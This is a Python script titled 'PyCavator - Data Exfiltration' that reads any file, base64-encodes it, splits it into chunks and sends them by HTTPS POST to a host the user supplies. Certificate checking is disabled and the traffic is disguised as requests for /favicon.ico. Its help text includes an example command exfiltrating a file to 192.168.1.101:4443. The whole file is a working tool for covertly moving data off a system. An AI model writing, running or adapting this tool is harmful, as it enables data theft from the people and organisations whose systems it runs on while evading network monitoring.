import os
import sys
import argparse
import base64
import time
import http.client
import ssl
import json

banner = '''
###############################################################
#                                                             #
#              PyCavator - Data Exfiltration                  #
#                                                             #
#                 Created by: Kryptohaker                     #
#                                                             #
###############################################################
'''
print(banner)

# Send data function
def send_data_https(args):
    # Read data from input file
    with open(args.input_file, 'rb') as f:
        data = f.read()

    # Encode data as base64
    data = base64.b64encode(data)

    # Split data into multiple chunks
    chunk_size = 65000
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    # Send data using POST requests
    url = f"https://{args.dst_addr}:{args.port}/favicon.ico"
    headers = {'Authorization': f"Bearer {args.token}", 'Content-Type': 'application/json'}
    chunk_num = 1
    print(f"[+] Starting send data to {args.dst_addr}:{args.port}")
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(args.dst_addr, args.port, context=context)
    for chunk in chunks:
        payload = {'filename': args.input_file, 'chunk': base64.b64encode(chunk).decode(), 'chunk_num': chunk_num, 'total_chunks': len(chunks)}
        json_payload = json.dumps(payload)
        conn.request('POST', url, json_payload, headers=headers)

        response = conn.getresponse()
        if response.status == 200:
            print(f"[+] Chunk {chunk_num} sent successfully to {args.dst_addr}:{args.port}")
        else:
            print(f"[-] Failed to send chunk {chunk_num}. Status code: {response.status}")

        chunk_num += 1

    conn.close()

# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='Send and receive data using HTTPS packets.',
        epilog='''Examples:
  # Sender mode: exfiltrate data from a file
  python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..."
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-f','--input_file', metavar='FILE', help='Input file path')
    parser.add_argument('-d','--dst_addr', metavar='ADDRESS', help='Destination address')
    parser.add_argument('-p','--port', metavar='PORT', type=int, help='Port number')
    parser.add_argument('-t','--token', metavar='TOKEN', type=str, help='Authorization token')
    args = parser.parse_args()

    # Check if no arguments were provided    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        exit(1)

    if not args.input_file or not args.dst_addr or not args.port or not args.token:
        print("Missing required arguments for sender mode. Please provide input file (-f), destination address (-d), authorization token (-t), and destination port (-p)")
        exit()
    send_data_https(args) 
        
if __name__ == '__main__':
    main()    